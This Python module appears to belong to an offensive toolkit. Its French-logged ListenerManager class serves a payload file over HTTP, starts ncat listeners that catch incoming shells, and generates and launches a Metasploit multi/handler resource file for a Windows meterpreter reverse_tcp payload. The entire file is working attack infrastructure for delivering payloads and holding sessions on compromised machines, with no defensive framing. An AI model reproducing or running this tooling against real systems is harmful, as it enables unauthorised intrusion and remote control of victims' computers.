import subprocess
import threading
import os
import shutil
import http.server
import socketserver
from core.logger import Logger

logger = Logger()

class ListenerManager:
    def __init__(self):
        self.processes = []
        self.httpd = None
        self.http_thread = None

    def start_http_server(self, port, payload_path):
        if not os.path.exists(payload_path):
            logger.error("Payload introuvable pour le serveur HTTP")
            return None
        os.chdir(os.path.dirname(payload_path) or '.')
        handler = http.server.SimpleHTTPRequestHandler
        self.httpd = socketserver.TCPServer(("", port), handler)
        self.http_thread = threading.Thread(target=self.httpd.serve_forever, daemon=True)
        self.http_thread.start()
        logger.info(f"Serveur HTTP démarré sur le port {port}, servant {os.path.basename(payload_path)}")
        return self.httpd

    def stop_http_server(self):
        if self.httpd:
            self.httpd.shutdown()
            self.httpd.server_close()
            self.httpd = None
            logger.info("Serveur HTTP arrêté")

    def start_ncat(self, port, ssl_cert=None):
        if not shutil.which("ncat"):
            logger.error("ncat n'est pas installé")
            return None
        cmd = ["ncat", "-lvnp", str(port)]
        if ssl_cert:
            key = ssl_cert.replace(".crt", ".key")
            if not os.path.exists(key):
                logger.error("Fichier de clé SSL introuvable")
                return None
            cmd = ["ncat", "--ssl", "--ssl-cert", ssl_cert, "--ssl-key", key, "-lvnp", str(port)]
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        self.processes.append(proc)
        logger.info(f"Listener ncat démarré sur le port {port}")
        return proc

    def start_msf(self, lhost, lport, payload="windows/x64/meterpreter/reverse_tcp"):
        if not shutil.which("msfconsole"):
            logger.error("msfconsole n'est pas installé")
            return None
        rc_content = f"""
use exploit/multi/handler
set PAYLOAD {payload}
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
exploit -j -z
"""
        rc_file = "listener.rc"
        with open(rc_file, "w", encoding='utf-8') as f:
            f.write(rc_content)
        proc = subprocess.Popen(["msfconsole", "-q", "-r", rc_file])
        self.processes.append(proc)
        logger.info(f"Listener Metasploit démarré sur {lhost}:{lport}")
        return proc

    def stop_all(self):
        for p in self.processes:
            try:
                p.terminate()
                p.wait(timeout=2)
            except:
                p.kill()
        self.processes.clear()
        self.stop_http_server()
        logger.info("Tous les listeners arrêtés")